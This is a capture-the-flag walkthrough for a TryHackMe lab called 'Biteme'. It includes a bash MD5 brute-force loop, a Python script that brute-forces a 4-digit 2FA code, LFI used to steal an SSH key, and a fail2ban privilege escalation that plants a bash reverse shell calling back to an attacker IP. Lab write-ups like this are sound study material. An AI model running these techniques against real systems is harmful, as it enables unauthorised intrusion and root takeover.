# Biteme: 

![Release Date: 12.03.2022](https://img.shields.io/badge/Release%20Date-12.10.2022-lightgrey.svg)

## Description

### Tryhackme Medium Room

## Summary

The initial scan shows 2 ports opened: 22,80.
The web server has an 'console' endpoint which is a login page ( which is protected with secureimage for bruteforcing ). 
Looking for the source this caught my attention:

```javascript

 function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
        return true;
      }

```

The message can be understood as it is, but it can also be unpacked to be more readable.

Which can be unpacked using <a href="https://matthewfl.com/unPacker.html">Unpacker</a> to :

```javascript

 function handleSubmit() 
	{
	        eval(function(p,a,c,k,e,r)
		{
		e=function(c)
			{
			return c.toString(a)
		};
		if(!''.replace(/^/,String))
			{
			while(c--)r[e(c)]=k[c]||e(c);
			k=[function(e)
				{
				return r[e]
			}
			];
			e=function()
				{
				return'\\w+'
			};
			c=1
		};
		while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);
		return p
	}
	('0.1(\'2\').3=\'4\';
	5.6(\'@7 8 9 a b c d e f g h i... j\');
	',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,
		{
	}
	))
	        return true;
	      
}
```


Anyway, the function can also be called in the console of the page, and it logs the message : 

```
@fred I turned on php file syntax highlighting for you to review... jason
```

Which made me search for <a href="https://www.php.net/manual/en/function.highlight-file.php">highlight_file</a> and found this:

```

Many servers are configured to automatically highlight files with a phps extension. For example, example.phps when viewed will show the syntax highlighted source of the file.

```

Using this we can read the source code of the page by going to `http://<ip>/console/index.phps`

This file includes `functions.php` which is used for authentication and can also be read using the same trick `(functions.phps)`.

This file reveals that the hash used for comparison should end in `001` and used a bash command to bruteforce it.

```bash
while IFS= read -r line; do printf '%s' "$line" |md5sum | awk '{print $1}' | grep -E "001$" && echo $line && break ; done < /usr/share/wordlists/rockyou.txt
```
Now we just need a user.

This again reveals other file , `config.php` , which has the source code also readable , and we find the user encoded in hex.

We decode it and get creds to log in.

After logging in, we now need to brute-force the 2FA code, as we see we have unlimited tries.
Created my script for it:
```python3

import requests

s = requests.Session()

cookies = {'PHPSESSID': '<cookie>','user':'<decoded_user>','pwd':'<found_pass>'}
s.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})


for i in range(0000,9999):
        a = '{:d}'.format(i).zfill(4)
        print(a,end='\r')
        r = s.post('http://<ip>/console/mfa.php',cookies=cookies,data='code={}'.format(a))
        if 'Incorrect code' not in r.text:
                #print(r.text)
                print('[+] Found the code: {}'.format(a))
                break

```

After getting a valid code, we now have lfi, using this to get the /ssh/id_rsa file of jason user which has a passphrase.
Using ss2john, and then using john with rockyou.txt we get the passphrase.

## Privesc 

By running `sudo -l` as user `jason` , we can impersonate user `fred` , which can also restart the `fail2ban` service on the machine.

Running 
```bash
find / -user fred 2>/dev/null
```
we find a strange file writable by fred, `/etc/fail2ban/action.d/iptables-multiport.conf`

Using this blog regarding <a href="https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/">fail2ban privesc</a>.

After replacing the `banaction` with our reverse shell `bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1", we have to restart the service, which user fred can do by running `sudo /bin/systemctl restart fail2ban`.

All we have to do now is to trigger the ban action. 

After reading the config file `/etc/fail2ban/jail.local` we see that it is triggered after 3 retries.

Now what's left for us to do is to try to log in using ssh and establish 3 sessions in wich we enter a wrong pass, after that we get the shell as root.
